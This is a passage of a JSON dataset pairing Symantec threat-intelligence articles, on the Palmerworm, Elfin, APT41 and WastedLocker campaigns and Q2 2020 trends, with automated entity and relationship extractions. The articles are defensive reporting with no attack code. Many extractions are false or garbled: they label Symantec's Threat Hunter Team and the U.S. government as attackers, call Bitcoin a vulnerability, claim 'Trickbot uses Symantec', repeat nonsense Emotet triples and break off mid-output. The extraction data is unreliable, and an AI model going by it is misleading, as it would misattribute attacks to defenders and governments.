          "hosting providers",
          "Organization"
        ],
        [
          "U.S.",
          "Country"
        ],
        [
          "Cybercrime",
          "Crime"
        ],
        [
          "banking credentials",
          "Vulnerability"
        ],
        [
          "financial institutions",
          "Organization"
        ],
        [
          "Ryuk ransomware",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "Trickbot",
          "uses",
          "Symantec"
        ],
        [
          "Trickbot",
          "targets",
          "financial institutions"
        ],
        [
          "Trickbot",
          "exploitedBy",
          "Ryuk ransomware"
        ],
        [
          "Trickbot",
          "causes",
          "Cybercrime"
        ],
        [
          "Trickbot",
          "spreads",
          "years"
        ],
        [
          "Trickbot",
          "is",
          "one of the world's largest botnets"
        ],
        [
          "Trickbot",
          "impacts",
          "financial institutions"
        ],
        [
          "Trickbot",
          "is",
          "targeted by ransomware"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 8
  },
  {
    "title": "palmerworm blacktech espionage apt",
    "link": "https://www.security.com/threat-intelligence/palmerworm-blacktech-espionage-apt",
    "content": "The Threat Hunter Team at Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered a new espionage campaign carried out by the Palmerworm group (aka BlackTech) involving a brand new suite of custom malware, targeting organizations in Japan, Taiwan, the U.S., and China. The attacks occurred in 2019 and continued into 2020, targeting organizations in the media, construction, engineering, electronics, and finance sectors. We observed the group using previously unseen malware in these attacks. Palmerworm uses a combination of custom malware, dual use tools, and living-off-the-land tactics in this campaign. Palmerworm has been active since at least 2013, with the first activity seen in this campaign in August 2019. Palmerworm was observed using both dual-use tools and custom malware in these attacks. Among the custom malware families we saw it use were: We have not observed the group using these malware families in previous attacks – they may be newly developed tools, or the evolution of older Palmerworm tools. Malware used by Palmerworm in the past has included: While the custom malware used by the group in this campaign is previously undocumented, other elements of the attack bear similarities to past Palmerworm campaigns, making us reasonably confident that it is the same group carrying out this campaign. As well as the four backdoors mentioned, we also see the group using a custom loader and a network reconnaissance tool, which Symantec detects as Trojan Horse and Hacktool. The group also used several dual-use tools, including: All these dual-use tools are commonly exploited by malicious actors like Palmerworm, with advanced persistent threat (APT) groups like this increasingly using living-off-the-land tactics, including the use of dual-use tools, in recent years. These tools provide attackers with a good degree of access to victim systems without the need to create complicated custom malware that can more easily be linked back to a specific group. In this campaign, Palmerworm is also using stolen code-signing certificates to sign its payloads, which makes the payloads appear more legitimate and therefore more difficult for security software to detect. Palmerworm has beenpublicly documentedusing stolen code-signing certificates in previous attack campaigns. We did not see what infection vector Palmerworm used to gain initial access to victim networks in this campaign, however, in the past the group has beendocumented as using spear-phishing emailsto gain access to victim networks. Symantec identified multiple victims in this campaign, in a number of industries, including media, construction, engineering, electronics, and finance. The media, electronics, and finance companies were all based in Taiwan, the engineering company was based in Japan, and the construction company in China. It is evident Palmerworm has a strong interest in companies in this region of East Asia. We also observed Palmerworm activity on some victims in the U.S., however, we were unable to identify the sector of the companies targeted. Palmerworm activity was first spotted in this campaign in August 2019, when activity was seen on the network of a Taiwanese media company and a construction company in China. The group remained active on the network of the media company for a year, with activity on some machines there seen as recently as August 2020. Palmerworm also maintained a presence on the networks of a construction and a finance company for several months. However, it spent only a couple of days on the network of a Japanese engineering company in September 2019, and a couple of weeks on the network of an electronics company in March 2020. It spent approximately six months on one of the U.S.-based machines on which we observed activity. The finance, media, and construction industries, then, appear to be of the biggest interest to Palmerworm in this campaign. There have been reports previously of Palmerwormtargeting the media sector. While we cannot see what Palmerworm is exfiltrating from these victims, the group is considered an espionage group and its likely motivation is considered to be stealing information from targeted companies. While the custom malware used in this attack is not malware we have seen used by Palmerworm before, some of the samples identified in this research are detected by other vendors as PLEAD, which is a known Palmerworm (aka Blacktech) malware family. We also saw the use of infrastructure that has previously been attributed to Palmerworm. The group’s use of dual-use tools has also been seen in previous campaigns identified as being carried out by Palmerworm, while the location of its victims is also typical of the geography targeted by Palmerworm in past campaigns. The group’s use of stolen code-signing certificates has also been observed in previous Palmerworm attacks. These various factors make us reasonably confident we can attribute this activity to Palmerworm. Symantec does not attribute Palmerworm’s activity to any specific geography, however,Taiwanese officials have stated publiclythat they believe Blacktech, which we track as Palmerworm, is backed by the Chinese government. APT groups continue to be highly active in 2020, with their use of dual-use tools and living-off-the-land tactics making their activity ever harder to detect, and underlining the need for customers to have a comprehensive security solution in place that can detect this kind of activity. The following protections are in place to protect customers against Palmerworm activity: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Threat Hunter Team, Attacker), (Palmerworm, Malware), (BlackTech, Attacker), (custom malware, Malware), (living-off-the-land tactics, Technique), (dual use tools, Tool), (network reconnaissance tool, Tool), (Trojan Horse, Tool), (Hackto, Tool)\\nRelationships: (Threat Hunter Team, uses, Palmerworm), (Palmerworm, uses, custom malware), (Palmerworm, uses, living-off-the-land tactics), (Palmerworm, uses, dual use tools), (Palmerworm, uses, network reconnaissance tool), (Palmerworm, uses, Trojan Horse), (Palmerworm, associatedWith, BlackTech), (Palmerworm, deploy, custom loader)",
      "entities": [
        [
          "Threat Hunter Team",
          "Attacker"
        ],
        [
          "Palmerworm",
          "Malware"
        ],
        [
          "BlackTech",
          "Attacker"
        ],
        [
          "custom malware",
          "Malware"
        ],
        [
          "living-off-the-land tactics",
          "Technique"
        ],
        [
          "dual use tools",
          "Tool"
        ],
        [
          "network reconnaissance tool",
          "Tool"
        ],
        [
          "Trojan Horse",
          "Tool"
        ],
        [
          "Hackto",
          "Tool"
        ],
        [
          "Threat Hunter Team",
          "uses",
          "Palmerworm"
        ],
        [
          "Palmerworm",
          "uses",
          "custom malware"
        ],
        [
          "Palmerworm",
          "uses",
          "living-off-the-land tactics"
        ],
        [
          "Palmerworm",
          "uses",
          "dual use tools"
        ],
        [
          "Palmerworm",
          "uses",
          "network reconnaissance tool"
        ],
        [
          "Palmerworm",
          "uses",
          "Trojan Horse"
        ],
        [
          "Palmerworm",
          "associatedWith",
          "BlackTech"
        ],
        [
          "Palmerworm",
          "deploy",
          "custom loader"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 0
  },
  {
    "title": "elfin indictments iran espionage",
    "link": "https://www.security.com/threat-intelligence/elfin-indictments-iran-espionage",
    "content": "UPDATE September 22:We have made some edits to this blog. An earlier version inaccurately described the links to the Elfin group as \"strong\". The U.S. government hasindicted three Iranian nationals on charges related to cyber attacks against aerospace and satellite technology companies. Said Pourkarim Arabi, Mohammad Reza Espargham, and Mohammad Bayati are alleged to have carried out a string of attacks between 2015 and 2019 which resulted in the theft of sensitive commercial information, intellectual property, and personal data from targeted organizations. According to the indictment, Arabi is a member of Iran’s Islamic Revolutionary Guard Corps (IRGC) and carried out the attacks with Espargham and Bayati on behalf of the IRGC. Espargham is alleged to be the leader of an Iranian hacking group known as the Iranian Dark Coders Team, while Bayati is alleged to be a malware developer who shared tools with Arabi and Espargham. The men are said to have obtained the names of individuals working in the aerospace and satellite industry, created fake accounts in their names, and used them to send spear-phishing emails to targeted organizations. If victims clicked on a malicious link within the email, malware would be installed on their computers. Once on the victim’s network, the attackers would escalate privileges, steal credentials, move laterally across the network, and deploy further malware on computers before exfiltrating data. Although not referenced specifically in the indictment, the attacks appear to have some links to the Elfin (aka APT33) cyber espionage group. Aside from the fact that the targets and tactics described in the indictment closely resemble Elfin activity observed by Symantec, there is also a commonality in tools used. According to the indictment, one of the main malware tools used in the attacks was the Nanocore RAT (Trojan.Nancrat). Although it was publicly available, Symantec has observed Elfin make extensive use of Nanocore. While we haven’t observed any other Iranian group utilizing this tool, other vendors have found cases. Symantec has been tracking Elfin since late 2015. Aside from compromising its victims with spear-phishing emails, the group is also known for scanning for vulnerable websites, either for potential victims or for use as command and control (C&C) infrastructure. To date it has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Aside from the U.S, Elfin is also heavily focused on targets in Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec between the start of 2016 and March 2019. During this time, Symantec also identifiedpossible links to the destructive Shamoon group. Symantec has observed multiple Elfin campaigns over the past 18 months. In February 2019, the group attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR in order to compromise an organization in the chemical sector in Saudi Arabia. In June 2019, Elfin sent out a phishing email to hundreds of recipients across multiple countries in what appeared to be an opportunistic trawling attack. The link within the document led recipients to dynamic DNS infrastructure controlled by the group. Subsequently, in late August 2019, Elfin compromised a victim in Saudi Arabia with a malicious HTA file. Following the initial compromise, Elfin continued to rely on the group’s known tools, tactics, and procedures (TTPs) to strengthen its foothold. During the incident, the legitimate utility mshta.exe executed a malicious HTA file with a job application theme. The file was downloaded after a victim used Microsoft Edge to visit a malicious website. A PowerShell command then downloaded a JPG file from a dynamic DNS host spoofing a U.S. defense contractor. In a separate announcement, the FBI hasalso issued a new cyber security advisory about an Iranian company called Rana Intelligence Computing Company, which it says is a front for the Chafer (aka APT39) cyber espionage group, which is linked to the Iranian Ministry of Intelligence and Security (MOIS). The FBI said Rana had systematically targeted and monitored Iranian citizens, dissidents, and journalists, along with government networks of Iran’s neighboring countries, and foreign organizations in the travel, academic, and telecommunications sectors. Simultaneously, the U.S. Treasury Department’s Office of Foreign Assets Control (OFAC)imposed sanctions on Rana, Chafer, and a number of named individuals who work for MOIS. Chafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. In 2018 Symantecobserved it mounting a number of ambitious new attacksincluding the compromise of a major telecoms services provider in the Middle East. State-sponsored espionage actors appear to be firmly in the sights of the U.S. Justice and Treasury Departments. These indictments and sanctions may generate an unwelcome amount of publicity and disruption for groups that may have believed they were operating with a degree of anonymity. Symantec has the following protection in place to protect customers against Elfin attacks: File-based protection Symantec has the following protection in place to protect customers against Chafer attacks: File-based protection IPS: network-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Elfin group, Threat Type), (U.S. government, Attacker), (Iranian nationals, Attacker), (Islamic Revolutionary Guard Corps, Attacker), (Iran's Islamic Revolutionary Guard Corps, Attacker), (Iranian Dark Coders Team, Attacker), (Malware Developer, Attacker), (Aerospace and Satellite Technology Companies, Target), (Mohammad Reza Espargham, Attacker), (Mohammad Bayati, Attacker), (Mohammad Bayati, Attacker), (Said Pourkarim Arabi, Attacker), (Elfin group, Threat Type), (U.S. government, Attacker), (Iranian nationals, Attacker), (Islamic Revolutionary Guard Corps, Attacker), (Iran's Islamic Revolutionary Guard Corps, Attacker), (Iranian Dark Coders Team, Attacker), (Malware Developer, Attacker), (Aerospace and Satellite Technology Companies, Target)\nRelationships: (Elfin group, linkedTo, U.S. government), (U.S. government, targets, Aerospace and Satellite Technology Companies), (Elfin group, linkedTo, Iranian nationals), (Elfin group, linkedTo, Islamic Revolutionary Guard Corps), (Elfin group, linkedTo, Iranian Dark Coders Team), (Elfin group, linkedTo, Malware Developer), (Elfin group, linkedTo, Aerospace and Satellite Technology Companies), (U.S. government, targets, Aerospace and Satellite",
      "entities": [
        [
          "Elfin group",
          "Threat Type"
        ],
        [
          "U.S. government",
          "Attacker"
        ],
        [
          "Iranian nationals",
          "Attacker"
        ],
        [
          "Islamic Revolutionary Guard Corps",
          "Attacker"
        ],
        [
          "Iran's Islamic Revolutionary Guard Corps",
          "Attacker"
        ],
        [
          "Iranian Dark Coders Team",
          "Attacker"
        ],
        [
          "Malware Developer",
          "Attacker"
        ],
        [
          "Aerospace and Satellite Technology Companies",
          "Target"
        ],
        [
          "Mohammad Reza Espargham",
          "Attacker"
        ],
        [
          "Mohammad Bayati",
          "Attacker"
        ],
        [
          "Mohammad Bayati",
          "Attacker"
        ],
        [
          "Said Pourkarim Arabi",
          "Attacker"
        ],
        [
          "Elfin group",
          "Threat Type"
        ],
        [
          "U.S. government",
          "Attacker"
        ],
        [
          "Iranian nationals",
          "Attacker"
        ],
        [
          "Islamic Revolutionary Guard Corps",
          "Attacker"
        ],
        [
          "Iran's Islamic Revolutionary Guard Corps",
          "Attacker"
        ],
        [
          "Iranian Dark Coders Team",
          "Attacker"
        ],
        [
          "Malware Developer",
          "Attacker"
        ],
        [
          "Aerospace and Satellite Technology Companies",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Elfin group",
          "linkedTo",
          "U.S. government"
        ],
        [
          "U.S. government",
          "targets",
          "Aerospace and Satellite Technology Companies"
        ],
        [
          "Elfin group",
          "linkedTo",
          "Iranian nationals"
        ],
        [
          "Elfin group",
          "linkedTo",
          "Islamic Revolutionary Guard Corps"
        ],
        [
          "Elfin group",
          "linkedTo",
          "Iranian Dark Coders Team"
        ],
        [
          "Elfin group",
          "linkedTo",
          "Malware Developer"
        ],
        [
          "Elfin group",
          "linkedTo",
          "Aerospace and Satellite Technology Companies"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 20,
    "relationship_count": 7
  },
  {
    "title": "apt41 indictments china espionage",
    "link": "https://www.security.com/threat-intelligence/apt41-indictments-china-espionage",
    "content": "The U.S. governmenthas charged seven men in relation to hundreds of cyber attacks against organizations in the U.S. and multiple other countries in Asia and Europe. Two of the men, who were based in Malaysia, were arrested and their extradition to the U.S. has been requested. The other five are based in China and remain at large. The attacks were attributed to a China-linked organization dubbed APT41 and involved a combination of intellectual property theft and financially motivated cyber crime. While some of our peers monitor APT41 as a single operation, Symantec regards it as two distinct actors: Grayfly and Blackfly. Grayfly has been particularly active in recent years, mounting high volume espionage attacks against organizations spread across Asia, Europe, and North America. They are interested in a wide range of sectors, including food, financial, healthcare, hospitality, manufacturing, telecoms, and government. It is known for using the Barlaiy/POISONPLUG and Crosswalk/ProxIP (Backdoor.Motnug) malware families in its attacks. Victims are frequently compromised by exploiting public facing web servers. In recent attacks, Symantec has seen Grayfly deploy Backdoor.Motnug against targeted organizations in conjunction with publicly available Cobalt Strike malware. Backdoor.Motnug provides the attackers with comprehensive remote access to the network and creates proxy connections allowing access to hard-to-reach segments of a target network. In one attack against a telecoms provider, Grayfly was seen using an internal tool capable of interacting with an SMS database, demonstrating that intelligence gathering was the motive of the attack. Prosecutors in the U.S. have charged three Chinese men– Jiang Lizhi, Qian Chuan, and Fu Qiang – with involvement in attacks that involve Grayfly tools and tactics. The trio are based in the Chinese city of Chengdu and all hold senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with “offensive” and “defensive” security operations. The indictment alleges that the three men were also involved in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Blackfly has been active since at least 2010 and is known for attacks involving the PlugX/Fast (Backdoor.Korplug), Winnti/Pasteboy (Backdoor.Winnti), and Shadowpad (Backdoor.Shadowpad) malware families. The group is best known for its attacks on the computer gaming industry. However, Symantec has also observed attacks on the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Recent Blackfly activity observed by Symantec saw the group deploy a slightly modified version of the Winnti malware against a telecoms organization in Taiwan. A feature of the attack was their use of the names of security vendors in naming files in an attempt to avoid raising suspicions. A dropper was signed with an invalid certificate with the subject \"McAfee, Inc.\"  The dropper then delivered several DLLs with file names that referenced Symantec software. The attackers had not compromised Symantec software, and were not leveraging it in the attack. In a separate indictment, prosecutors allege that two Malaysian nationals – Wong Ong Hua and Ling Yang Ching –were involved in attacks that involved Blackfly tools and tactics. Wong is the founder and CEO of a company called Sea Gamer Mall, while Ling is its chief product officer and a shareholder. The duo are alleged to have collaborated with other attackers to mount a string of attacks against computer game companies in order to obtain in-game digital items, such as currencies, and then selling them for profit. While Grayfly and Blackfly appear to be distinct operations, the indictments allege that there is a link between the two groups. Two Chinese men – Zhang Haoran and Tan Dailin –are charged in a third indictment with collaborating with both groups. The two men are reported to have worked for a time at Chengdu 404, the company that prosecutors identify as linked to Grayfly attacks. However, they are also alleged to have collaborated with the charged Blackfly actors in order to make additional money by mounting attacks on computer gaming companies. The indictment alleges that in several instances, they used their unauthorized access to gaming company networks to kick other attackers off the network, effectively eliminating their competition. Grayfly and Blackfly have been prolific attackers in recent years and, while it remains to be seen what impact the charges will have on their operations, the publicity surrounding the indictments will certainly be unwelcome among attackers who wish to maintain a low profile. Symantec remains committed to tracking the activity of these groups in order to protect our customers from their attacks. Symantec products protect against threats discussed in this blog with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (U.S. government, Entity), (Malaysia, Country), (China, Country), (APT41, Attacker), (Grayfly, Attacker), (Blackfly, Attacker), (Barlaiy/POISONPLUG, Malware), (Crosswalk/ProxIP, Malware), (Backdoor.Motnug, Malware), (telecoms, Sector), (Cobalt Strike, Tool), (public-facing web server, Vulnerability), (proxy connection, TTP)\nRelationships: (U.S. government, charges, seven men), (seven men, arrested, two men), (two men, extradited, U.S.), (two men, remains, five men), (five men, remain, China), (attacks, attributedTo, APT41), (attacks, involve, intellectual property theft), (attacks, involve, financially motivated cyber crime), (Grayfly, isPartOf, APT41), (Grayfly, isPartOf, Blackfly), (Grayfly, interests, food), (Grayfly, interests, financial), (Grayfly, interests, healthcare), (Grayfly, interests, hospitality), (Grayfly, interests, manufacturing), (Grayfly, interests, telecoms), (Grayfly, interests, government), (Grayfly, uses, Barlaiy/POISONPLUG), (Grayfly, uses, Crosswalk/Prox",
      "entities": [
        [
          "U.S. government",
          "Entity"
        ],
        [
          "Malaysia",
          "Country"
        ],
        [
          "China",
          "Country"
        ],
        [
          "APT41",
          "Attacker"
        ],
        [
          "Grayfly",
          "Attacker"
        ],
        [
          "Blackfly",
          "Attacker"
        ],
        [
          "Barlaiy/POISONPLUG",
          "Malware"
        ],
        [
          "Crosswalk/ProxIP",
          "Malware"
        ],
        [
          "Backdoor.Motnug",
          "Malware"
        ],
        [
          "telecoms",
          "Sector"
        ],
        [
          "Cobalt Strike",
          "Tool"
        ],
        [
          "public-facing web server",
          "Vulnerability"
        ],
        [
          "proxy connection",
          "TTP"
        ]
      ],
      "relationships": [
        [
          "U.S. government",
          "charges",
          "seven men"
        ],
        [
          "seven men",
          "arrested",
          "two men"
        ],
        [
          "two men",
          "extradited",
          "U.S."
        ],
        [
          "two men",
          "remains",
          "five men"
        ],
        [
          "five men",
          "remain",
          "China"
        ],
        [
          "attacks",
          "attributedTo",
          "APT41"
        ],
        [
          "attacks",
          "involve",
          "intellectual property theft"
        ],
        [
          "attacks",
          "involve",
          "financially motivated cyber crime"
        ],
        [
          "Grayfly",
          "isPartOf",
          "APT41"
        ],
        [
          "Grayfly",
          "isPartOf",
          "Blackfly"
        ],
        [
          "Grayfly",
          "interests",
          "food"
        ],
        [
          "Grayfly",
          "interests",
          "financial"
        ],
        [
          "Grayfly",
          "interests",
          "healthcare"
        ],
        [
          "Grayfly",
          "interests",
          "hospitality"
        ],
        [
          "Grayfly",
          "interests",
          "manufacturing"
        ],
        [
          "Grayfly",
          "interests",
          "telecoms"
        ],
        [
          "Grayfly",
          "interests",
          "government"
        ],
        [
          "Grayfly",
          "uses",
          "Barlaiy/POISONPLUG"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 18
  },
  {
    "title": "threat landscape trends q2 2020",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-trends-q2-2020",
    "content": "As the first half of the year drew to a close, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from April, May, and June 2020. From a resurgence in cryptojacking activity to the return of a major malware distribution platform, let’s take a quick look at the trends that shaped the cyber security threat landscape in the second quarter of 2020. After a sharp decline in cryptojacking following the shutdown of browser-based mining script maker CoinHive in March 2019, the second quarter of 2020 saw a resurgence in activity. Browser-based cryptojacking events blocked by Symantec saw a 163 percent increase in Q2 2020 compared to the previous quarter. This spike in activity coincides with an increase in the value of cryptocurrencies, including Bitcoin and Monero, which are two currencies often mined by browser-based coinminers. For more information on cryptojacking, read our blog: Cryptojacking: A Modern Cash Cow As countries around the world began easing COVID-19 lockdown restrictions, malware distributors also resumed working at full capacity. May and June saw a significant increase in the number of malware attacks blocked by Symantec, a division of Broadcom (NASDAQ: AVGO). In total, Symantec blocked over 60 million infection attempts in the second quarter of 2020, which represents a 74.6 percent increase over the previous quarter. For over a year, the Emotet botnet (Trojan.Emotet) has been subdued, with two long periods of inactivity: Between May and September 2019 and again between February and July 2020. This drop-off in activity is reflected in Symantec’s detections of new Emotet infections during this period. However, while activity for Q2 remained nominal, the botnet ramped up its activity in early Q3. Emotet's return is a source of concern, since it is a major malware distribution platform. For more information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor There was an increase in attacks using the targeted Sodinokibi ransomware (Ransom.Sodinokibi), also known as REvil, in the second quarter of 2020. Following a lull in March, activity began to increase again in April. By the end of Q2, Sodinokibi activity was up by over 630 percent, compared to the end of Q1. This ties in with research from Symantec in June which revealed a Sodinokibi campaign in which the attackers were using the Cobalt Strike commodity malware to deliver Sodinokibi to victims in the healthcare, services, and food sectors. For additional information on Sodinokibi, read our blog: Sodinokibi: Ransomware Attackers also Scanning for PoS Software, Leveraging Cobalt Strike A growing number of attacks in recent months have involved the use of Cobalt Strike (Backdoor.Cobalt), a multipurpose commodity malware available for purchase, most notably used in the WastedLocker (Ransom.WastedLocker) targeted ransomware attacks. Reflecting this trend, detections of intrusions involving confirmed Cobalt Strike usage are up significantly in the past two quarters. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. For more information on WastedLocker and its use of Cobalt Strike, read our blog: WastedLocker: Symantec Identifies Wave of Attacks Against U.S. Organizations The Lokibot information-stealing malware (Infostealer.Lokibot) saw a spike in activity in June, with blocked attacks increasing by almost 800 percent over the previous month. If this increased activity continues, Q3 could see Lokibot match or surpass activity seen in Q1. Lokibot, one of today’s most prevalent information-stealing threats, is often distributed via spam campaigns. Symantec recently began monitoring two new spam campaigns spreading Lokibot and targeting medium and large businesses around the world. One campaign involves the impersonation of a Saudi company specializing in industrial services and another impersonates a large shipping firm. The number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 12 percent in Q2 compared to Q1 2020. However, Q2 2020 still saw a greater number of attacks (14 percent more) compared to Q4 2019. While the numbers may be down, the risk of attack against internet-connected devices still remains high, as highlighted by a recent alert jointly released by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the UK’s National Cyber Security Centre (NCSC) warning QNAP NAS device owners to update their devices in case QSnatch malware attacks restart. The number of unique IP addresses performing IoT attacks also fell in Q2, down 19 percent over the previous quarter. *Symantec’s IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U.S. followed by China, Taiwan, Brazil, and Russia. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices. For the latest insights on threat intelligence visitSymantec Enterprise Blog/Threat Intelligence. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (cryptojacking, Threat Type), (browser-based cryptojacking, Technique), (Symantec, Tool), (Bitcoin, Vulnerability), (Monero, Vulnerability), (Emotet, Malware), (Trojan.Emotet, Malware), (Broadcom, Tool)\\nRelationships: (cryptojacking, resurfaces, browser-based cryptojacking), (browser-based cryptojacking, blocks, Symantec), (Symantec, detects, browser-based cryptojacking), (bitcoin, exploitedBy, Emotet), (monero, exploitedBy, Emotet), (emotet, uses, Trojan.Emotet), (trojan.emotet, uses, Emotet), (emotet, detectedBy, Symantec), (symantec, detects, emotet), (cryptocurrency, affectedBy, Emotet), (cryptocurrency, affectedBy, Emotet), (emotet, associatedWith, Broadcom), (emotet, deployedBy, Emotet), (emotet, launchedBy, Emotet), (emotet, communicatedWith, Emotet), (emotet, connectedTo, Emotet), (emotet, installedOn, Emotet), (emotet, executedOn, Emotet), (emotet, ranOn, Emotet), (emotet",
      "entities": [
        [
          "cryptojacking",
          "Threat Type"
        ],
        [
          "browser-based cryptojacking",
          "Technique"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "Bitcoin",
          "Vulnerability"
        ],
        [
          "Monero",
          "Vulnerability"
        ],
        [
          "Emotet",
          "Malware"
        ],
        [
          "Trojan.Emotet",
          "Malware"
        ],
        [
          "Broadcom",
          "Tool"
        ],
        [
          "cryptojacking",
          "resurfaces",
          "browser-based cryptojacking"
        ],
        [
          "browser-based cryptojacking",
          "blocks",
          "Symantec"
        ],
        [
          "Symantec",
          "detects",
          "browser-based cryptojacking"
        ],
        [
          "bitcoin",
          "exploitedBy",
          "Emotet"
        ],
        [
          "monero",
          "exploitedBy",
          "Emotet"
        ],
        [
          "emotet",
          "uses",
          "Trojan.Emotet"
        ],
        [
          "trojan.emotet",
          "uses",
          "Emotet"
        ],
        [
          "emotet",
          "detectedBy",
          "Symantec"
        ],
        [
          "symantec",
          "detects",
          "emotet"
        ],
        [
          "cryptocurrency",
          "affectedBy",
          "Emotet"
        ],
        [
          "cryptocurrency",
          "affectedBy",
          "Emotet"
        ],
        [
          "emotet",
          "associatedWith",
          "Broadcom"
        ],
        [
          "emotet",
          "deployedBy",
          "Emotet"
        ],
        [
          "emotet",
          "launchedBy",
          "Emotet"
        ],
        [
          "emotet",
          "communicatedWith",
          "Emotet"
        ],
        [
          "emotet",
          "connectedTo",
          "Emotet"
        ],
        [
          "emotet",
          "installedOn",
          "Emotet"
        ],
        [
          "emotet",
          "executedOn",
          "Emotet"
        ],
        [
          "emotet",
          "ranOn",
          "Emotet"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 27,
    "relationship_count": 0
  },
  {
    "title": "wastedlocker ransomware us",
    "link": "https://www.security.com/threat-intelligence/wastedlocker-ransomware-us",
    "content": "UPDATE June 30:Further investigation by Symantec has confirmed dozens of U.S. newspaper websites owned by the same parent company have been compromised by SocGholish injected code. Some of the organizations targeted by WastedLocker could have been compromised when an employee browsed the news on one of its websites. Symantec has notified the company and it has now removed the malicious code. Symantec, a division of Broadcom (NASDAQ: AVGO), has identified and alerted our customers to a string of attacks against U.S. companies by attackers attempting to deploy the WastedLocker ransomware (Ransom.WastedLocker) on their networks. The end goal of these attacks is to cripple the victim’s IT infrastructure by encrypting most of their computers and servers in order to demand a multimillion dollar ransom. At least 31 customer organizations have been attacked, meaning the total number of attacks may be much higher. The attackers had breached the networks of targeted organizations and were in the process of laying the groundwork for staging ransomware attacks. WastedLocker is a relatively new breed of targeted ransomware,documented just prior to our publication by NCC Group, while Symantec was performing outreach to affected networks. WastedLocker has been attributed to the notorious “Evil Corp” cyber crime outfit. Evil Corp has previously been associated with theDridex banking Trojanand BitPaymer ransomware, which are believed to have earned their creators tens of millions of dollars. Two Russian men who are alleged to be involved in the grouphave open indictments against them in the U.S. The attacks begin with a malicious JavaScript-based framework known as SocGholish, tracked to more than 150 compromised websites, which masquerades as a software update. Once the attackers gain access to the victim’s network, they use Cobalt Strike commodity malware in tandem with a number of living-off-the-land tools to steal credentials, escalate privileges, and move across the network in order to deploy the WastedLocker ransomware on multiple computers. The attacks were proactively detected on a number of customer networks by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) who verified it and quickly realized it corresponded closely to publicly documented activity seen in the early stages of WastedLocker attacks. This discovery enabled us to identify further organizations that had been targeted by WastedLocker and identify additional tools, tactics, and procedures used by the attackers, helping us to strengthen our protection against every stage of the attack. Symantec has uncovered attacks against 31 organizations to date, all of which were located in the U.S. The vast majority of targets are major corporations, including many household names. Aside from a number of large private companies, there were 11 listed companies, eight of which are Fortune 500 companies. All but one of the targeted organizations are U.S. owned, with the exception being a U.S.-based subsidiary of an overseas multinational. Organizations in a diverse range of sectors were attacked. Manufacturing was the sector most affected, accounting for five targeted organizations. This was followed by Information Technology (four) and Media and Telecommunications (three). Had the attackers not been disrupted, successful attacks could have led to millions in damages, downtime, and a possible domino effect on supply chains. The initial compromise of an organization involves the SocGholish framework, which is delivered to the victim in a zipped file via compromised legitimate websites. Symantec has discovered at least 150 different legitimate websites that refer traffic to websites hosting the SocGholish zip file. It is possible that these websites lead to different malware, as such redirection services can be utilized by multiple actors at the same time. The zipped file contains malicious JavaScript, masquerading as a browser update. A second JavaScript file is then executed by wscript.exe. This JavaScript first profiles the computer using commands such as whoami, net user, and net group, then uses PowerShell to download additional discovery related PowerShell scripts. The next stage of the attack is to deploy Cobalt Strike. PowerShell is used to download and execute a loader from a domain publicly reported as being used to deliver Cobalt Strike as part of WastedLocker attacks. The loader also shared a command and control (C&C) domain with this reported Cobalt Strike infrastructure. The loader contained a .NET injector, also reportedly seen in WastedLocker attacks. The injector, along with the loader for Cobalt Strike Beacon, is reportedly taken from an open-source project called Donut, which is designed to help inject and execute in-memory payloads. The injected payload is known as Cobalt Strike Beacon and can be used to execute commands, inject other processes, 